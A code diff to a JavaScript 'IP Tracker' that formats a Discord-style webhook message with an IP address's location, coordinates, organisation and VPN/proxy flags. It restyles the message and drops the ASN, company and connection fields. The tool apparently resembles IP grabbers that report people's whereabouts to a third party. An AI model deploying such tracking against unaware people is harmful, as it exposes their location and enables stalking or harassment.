@@ -22,31 +22,15 @@
 
             const embed = {
                 username: "IP Tracker",
-                avatar_url: "https://cdn-icons-png.flaticon.com/512/3061/3061341.png", 
+                avatar_url: "https://www.experten.de/content.4923677.images.wpdht.Netzwerk-IP-180806077-AS-flashmovie.jpg", 
                 embeds: [{
                     title: "🌍 IP Information",
-                    color: 3447003, // Blue
+                    color: 000000,
                     fields: [
                         { name: "📌 IP Address", value: info.ip || 'N/A', inline: false },
                         { name: "📍 Location", value: `${info.city || 'N/A'}, ${info.region || 'N/A'}, ${info.country || 'N/A'}`, inline: false },
                         { name: "📌 Coordinates", value: info.loc || 'N/A', inline: false },
                         { name: "🏢 Organization", value: info.org || 'N/A', inline: false },
-
-                        { name: "🌐 Network Details", value: "**ASN:** " + (info.asn?.asn || 'N/A') +  
-                            "\n**ASN Name:** " + (info.asn?.name || 'N/A') +  
-                            "\n**ASN Domain:** " + (info.asn?.domain || 'N/A') +  
-                            "\n**ASN Route:** " + (info.asn?.route || 'N/A') +  
-                            "\n**ASN Type:** " + (info.asn?.type || 'N/A'), inline: false },
-
-                        { name: "🏢 Company Details", value: "**Company Name:** " + (info.company?.name || 'N/A') +  
-                            "\n**Company Domain:** " + (info.company?.domain || 'N/A') +  
-                            "\n**Company Type:** " + (info.company?.type || 'N/A'), inline: false },
-
-                        { name: "⚡ Connection Type", value: "**Anycast:** " + (info.is_anycast ? "✅ Yes" : "❌ No") +  
-                            "\n**Mobile:** " + (info.is_mobile ? "✅ Yes" : "❌ No") +  
-                            "\n**Anonymous:** " + (info.is_anonymous ? "✅ Yes" : "❌ No") +  
-                            "\n**Satellite:** " + (info.is_satellite ? "✅ Yes" : "❌ No") +  
-                            "\n**Hosting:** " + (info.is_hosting ? "✅ Yes" : "❌ No"), inline: false },
 
                         { name: "🔒 Privacy Details", value: "**VPN:** " + (info.privacy?.vpn ? "✅ Yes" : "❌ No") +  
                             "\n**Proxy:** " + (info.privacy?.proxy ? "✅ Yes" : "❌ No") +  
@@ -54,7 +38,7 @@
                             "\n**Relay:** " + (info.privacy?.relay ? "✅ Yes" : "❌ No") +  
                             "\n**Hosting Provider:** " + (info.privacy?.service || 'N/A'), inline: false }
                     ],
-                    footer: { text: "IP Tracker | Data from ipinfo.io" },
+                    footer: { text: "IP Tracker | By 3am.unknown" },
                     timestamp: new Date()
                 }]
             };
